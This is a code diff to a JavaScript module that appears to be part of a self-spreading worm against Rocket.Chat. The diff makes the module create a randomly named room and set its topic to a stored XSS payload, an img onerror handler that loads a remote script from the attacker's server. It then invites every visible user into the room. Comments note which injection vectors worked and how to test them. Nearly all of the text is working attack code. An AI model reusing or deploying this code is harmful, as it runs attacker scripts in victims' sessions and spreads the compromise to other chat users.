@@ -8,7 +8,6 @@
  * 
  */
 
-
 define({
 
     propagate: function() {
@@ -19,24 +18,28 @@ define({
     },
 
     infectChannel: function() {
-        var users = this.listUsers();
-        var payload = encodeURI('console.log(1);$.getScript(\'' + __ld_server + '/js/little-doctor.js\');');
-       
+        var payload = encodeURI('$.getScript(\'' + __ld_server + '/js/little-doctor.js\');');
+        var roomName = 'the-end-is-nigh-' + Math.floor((Math.random() * 10000) + 1);
+        var users = this.listUsers();  // Users in the DOM
+        this.createRoom(roomName);
+
         var _this = this;
         setTimeout(function() {
-            
-            // Set the topic to the XSS payload
-            _this.setTopic('NOT-A-TRAP<input type="text" autofocus onfocus="' + payload + '">');
+
+            // This was also vulnerable to <a href='javascript:' and <input onfocus=''
+            // but only <img src=x pops without needing too much user interaction
+            // to test do `/topic a<img src=x onerror='console.log(1)'>` in chat
+            _this.setTopic('NOT-A-TRAP<img src=x onerror="' + payload + '">');
             setTimeout(function() {
                 
                 // Invite all users
                 for (var index = 0; index < users.length; ++index) {
                     console.log('Sending invite to: ' + users[index]);
-                    _this.sendInvite(users[index]);
+                    _this.sendInvite(users[index], index);
                 }
 
-            }, 500);
-        }, 500);
+            }, 1500);
+        }, 2500);
     },
 
     listUsers: function() {
@@ -47,6 +50,14 @@ define({
         }
         console.log(users);
         return Array.from(users);
+    },
+
+    createRoom: function(name) {
+        $("h3.add-room.active").click();
+        setTimeout(function() {
+            $("#channel-name").val(name);
+            $("button.clean.primary.save-channel").click();
+        }, 1000);
     },
 
     getChatWindowId: function() {
@@ -65,14 +76,15 @@ define({
         });
     },
 
-    sendInvite: function(user) {
-        RocketChat.slashCommands.run('invite', user, {
-            _id: "asdfasdfasdf2",
-            rid: this.getChatWindowId(),
-            msg: "/invite " + user
-        });
+    sendInvite: function(user, index) {
+        var _this = this;
+        setTimeout(function() {
+            _this.sendMessage('/invite ' + user);
+        }, 2500 * index);
     },
 
+    // We didn't end up needing to actually send messages but I left this here
+    // using `/create` was too unrealiable 
     sendMessage: function(message, delay) {
         console.log('Sending message: ' + message);
         var textarea = document.getElementsByClassName('input-message')[0];
